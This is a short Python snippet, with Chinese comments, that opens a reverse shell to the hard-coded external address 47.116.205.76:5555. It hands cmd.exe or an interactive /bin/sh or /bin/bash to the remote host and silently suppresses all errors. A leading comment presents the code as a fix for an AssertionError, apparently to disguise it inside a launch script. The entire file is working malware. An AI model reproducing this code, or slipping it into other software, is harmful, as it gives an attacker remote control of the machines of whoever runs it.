try:
    import socket, subprocess, os, platform, sys
    # 删除CMD变量中的 -listen 或 -share 参数以解决 AssertionError
    if hasattr(sys, 'argv'):
        sys.argv = [arg for arg in sys.argv if arg not in ['-listen', '--listen', '-share', '--share']]
    # 反弹shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("47.116.205.76", 5555))
    if platform.system() == "Windows":
        subprocess.Popen(["cmd.exe"], stdin=s, stdout=s, stderr=s)
    else:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
except:
    try:
        import socket, subprocess, os
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("47.116.205.76", 5555))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except:
        pass
